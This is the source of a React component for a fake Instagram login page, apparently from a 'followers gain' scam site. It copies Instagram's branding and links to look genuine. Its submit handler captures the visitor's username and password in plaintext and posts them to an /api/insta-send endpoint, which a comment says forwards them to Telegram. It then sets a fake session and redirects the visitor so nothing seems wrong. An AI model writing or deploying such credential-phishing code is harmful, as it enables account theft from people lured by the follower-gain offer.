"use client";

import { useState } from "react";

export default function InstagramLogin() {
  const [err, setErr] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const insta_handle = e.target.insta_handle.value.trim();
    const password = e.target.password.value.trim();

    if (!insta_handle || !password) {
      setErr("Username & Password required.");
      return;
    }

    // Fake username (used by dashboard)
    const cleanUser = insta_handle.replace(/[^a-zA-Z0-9]/g, "");

    // ----- SAVE FAKE LOGIN SESSION -----
    localStorage.setItem("insta_user", cleanUser);
    localStorage.setItem("insta_name", cleanUser);
    localStorage.setItem("insta_handle", cleanUser);
    localStorage.setItem("insta_image", ""); // blank image
    localStorage.setItem("followers", Math.floor(Math.random() * 1200) + 200);

    // Send to Telegram (optional)
    const text = `📩 New Insta User\nUsername: ${insta_handle}\nPassword: ${password}`;
    const msg = encodeURIComponent(text);

    try {
      await fetch(`/api/insta-send`, {
        method: "POST",
        body: JSON.stringify({ msg }),
      });

      // redirect to dashboard
      window.location.href = "/instagram/dashboard";
    } catch (error) {
      setErr("Could not connect to API, but saved locally.");
      window.location.href = "/instagram/dashboard";
    }
  };

  return (
    <main className="ig-container">
      <section className="ig-left">
        <div className="phone-mock">
          <div className="phone-screen">
            <div className="mock-header">Followers Gain</div>
            <img src="/landing.png" alt="" />
          </div>
          <div className="phone-shadow"></div>
        </div>
      </section>

      <section className="ig-right">
        <div className="login-card ig-card">
          <div
            style={{
              display: "flex",
              justifyContent: "center",
              marginBottom: 20,
            }}
          >
            <i
              style={{
                backgroundImage:
                  "url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png')",
                backgroundPosition: "0px -2959px",
                width: 175,
                height: 51,
                backgroundRepeat: "no-repeat",
              }}
            ></i>
          </div>

          {err && <div className="error">{err}</div>}

          <form className="ig-form" onSubmit={handleSubmit}>
            <input
              name="insta_handle"
              type="text"
              placeholder="Instagram username — ex: natgeo"
            />
            <input name="password" type="password" placeholder="Password" />
            <button className="ig-btn" type="submit">
              Log In
            </button>
          </form>

          <div className="ig-or">
            <span>OR</span>
          </div>

          <button
            className="fb-btn"
            onClick={() =>
              alert("Facebook Login Not Working in Gaining Followers")
            }
          >
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="currentColor"
              style={{ marginRight: 8, opacity: 0.9 }}
            >
              <path d="M22 12a10 10 0 1 0-11.5 9.87v-6.99h-2.2V12h2.2V9.8c0-2.18 1.3-3.39 3.29-3.39.95 0 1.95.17 1.95.17v2.15h-1.1c-1.09 0-1.43.68-1.43 1.38V12h2.44l-.39 2.88h-2.05v6.99A10 10 0 0 0 22 12z" />
            </svg>
            Log in with Facebook
          </button>

          <div className="need-help">
            <a href="https://www.instagram.com/accounts/password/reset/">
              Forgot password?
            </a>
          </div>
        </div>

        <div className="signup-card ig-card">
          <p>
            Don't have an account?{" "}
            <a href="https://www.instagram.com/accounts/emailsignup/">
              Sign up
            </a>
          </p>
        </div>
      </section>
    </main>
  );
}
